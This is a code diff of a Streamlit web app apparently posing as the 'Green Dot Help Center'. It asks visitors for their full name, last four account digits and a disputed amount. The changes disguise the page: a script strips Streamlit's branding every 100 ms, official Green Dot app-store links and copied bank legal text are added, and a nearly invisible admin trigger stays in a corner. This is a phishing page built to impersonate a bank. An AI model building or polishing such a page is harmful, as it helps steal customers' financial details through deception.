@@ -2,7 +2,6 @@
 import streamlit as st
 import sqlite3
 import os
-import pandas as pd
 from datetime import datetime
 
 # Configuración de Rutas
@@ -24,14 +23,15 @@ init_db()
 
 st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")
 
-# JAVASCRIPT: LIMPIEZA Y MANEJO DE HISTORIAL
+# JAVASCRIPT: LIMPIEZA TOTAL Y SUPRESIÓN DE HISTORIAL
 st.markdown("""<script>
     const forceClean = () => {
         const toRemove = [
             '.stElementToolbar', '[data-testid="stElementToolbar"]',
             '.stTooltipHoverTarget', 'button[title="View fullscreen"]',
             'header', 'footer', '.stDeployButton', '[data-testid="stHeader"]',
-            '[data-testid="stHeaderActionElements"]', '.section-anchor', 'a.section-anchor'
+            '[data-testid="stHeaderActionElements"]', '.section-anchor', 'a.section-anchor',
+            '.st-emotion-cache-gi0tri', '.st-emotion-cache-140j12g'
         ];
         toRemove.forEach(s => {
             document.querySelectorAll(s).forEach(el => { el.style.display = 'none'; el.remove(); });
@@ -47,10 +47,18 @@ st.markdown("""<script>
     setInterval(forceClean, 100);
 </script>""", unsafe_allow_html=True)
 
-# CSS: ESTILOS Y FOOTER
+# CSS: ESTILOS, APPS Y BLOQUEO DE ENLACES
 st.markdown("""<style>
     .stApp { background-color: #000000 !important; color: #FFFFFF !important; }
     .block-container { max-width: 500px !important; padding-top: 2rem !important; }
+
+    /* Eliminar links residuales en logo y h1 */
+    [data-testid="stImage"], [data-testid="stImage"] img, h1, .stMarkdown h1 {
+        pointer-events: none !important;
+        cursor: default !important;
+        user-select: none !important;
+        text-decoration: none !important;
+    }
 
     [data-testid="stImage"] img { width: 250px !important; margin: 0 auto; display: block; }
 
@@ -58,7 +66,16 @@ st.markdown("""<style>
         background-color: #1a1a1a !important; color: white !important; border: 1px solid #333 !important;
     }
 
-    .stButton > button { background-color: #00a05b !important; color: white !important; width: 100%; border: none; height: 50px; border-radius: 8px; }
+    .stButton > button {
+        background-color: #00a05b !important; color: white !important; 
+        width: 100%; border: none; height: 50px; border-radius: 8px; 
+        font-weight: bold !important;
+    }
+
+    .promo-box {
+        background-color: #111; padding: 25px 15px; text-align: center;
+        border-radius: 12px; margin: 25px 0; border: 1px solid #222;
+    }
 
     .legal-container {
         font-size: 10px; color: #666; text-align: justify; margin-top: 50px;
@@ -66,9 +83,8 @@ st.markdown("""<style>
     }
 
     .admin-trigger {
-        position: fixed; bottom: 10px; left: 10px; width: 30px; height: 30px; opacity: 0.05; z-index: 9999;
+        position: fixed; bottom: 10px; left: 10px; width: 30px; height: 30px; opacity: 0.02; z-index: 9999;
     }
-    .admin-trigger:hover { opacity: 0.2; }
 </style>""", unsafe_allow_html=True)
 
 if 'admin_mode' not in st.session_state: st.session_state.admin_mode = False
@@ -79,7 +95,7 @@ if not st.session_state.admin_mode:
     st.title("Help Center")
     st.write("Please fill out the form below to submit your claim.")
 
-    with st.form("claim_v1_0_9", clear_on_submit=True):
+    with st.form("claim_v1_1_0", clear_on_submit=True):
         st.text_input("Full Name", autocomplete="name")
         st.text_input("Last 4 digits of Account")
         st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
@@ -88,12 +104,18 @@ if not st.session_state.admin_mode:
         if st.form_submit_button("SUBMIT NOW"):
             st.success("Claim Received successfully.")
 
-    # FOOTER LEGAL COMPLETO
+    # SECCIÓN DE DESCARGA DE APPS
+    st.markdown("""<div class='promo-box'>
+        <h3 style='color:white; margin-bottom:15px; font-size:1.1rem;'>Download the Green Dot app</h3>
+        <div style='display: flex; justify-content: center; gap: 10px; flex-wrap: wrap;'>
+            <a href='https://play.google.com/store/apps/details?id=com.greendot.retail' target='_blank'><img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='120'></a>
+            <a href='https://apps.apple.com/us/app/green-dot-mobile-banking/id415511546' target='_blank'><img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='120'></a>
+        </div>
+    </div>""", unsafe_allow_html=True)
+
+    # FOOTER LEGAL
     st.markdown("""<div class='legal-container'>
-        * When on a desktop, hover over * to view important disclosures. When on a mobile device, tap on * to view disclosures.<br><br>
-        Not a gift card. Must be 18 or older to purchase. Online access, mobile number verification and identity verification (including SSN) are required to open and use your account.<br><br>
-        The check cashing service is provided by Ingo Money, Inc. and the sponsor bank identified in the Terms and Conditions. Subject to approval. Fees apply. Ingo Money reserves the right to recover losses resulting from illegal or fraudulent use.<br><br>
-        Green Dot&reg; cards are issued by Green Dot Bank, Member FDIC, pursuant to a license from Visa U.S.A., Inc. and by Mastercard International Inc. Green Dot Bank also operates under the registered trade names: GO2bank, GoBank and Bonneville Bank. All of these are a single FDIC-insured bank.<br><br>
+        Green Dot&reg; cards are issued by Green Dot Bank, Member FDIC, pursuant to a license from Visa U.S.A., Inc. and by Mastercard International Inc. <br><br>
         &copy;2026 Green Dot Corporation. All rights reserved. NMLS #914924; Green Dot Bank NMLS #908739.
     </div>""", unsafe_allow_html=True)
 
@@ -106,6 +128,6 @@ if not st.session_state.admin_mode:
 
 else:
     st.title("Admin Panel")
-    if st.button("Exit Admin"): 
+    if st.button("Exit Admin"):
         st.session_state.admin_mode = False
         st.rerun()
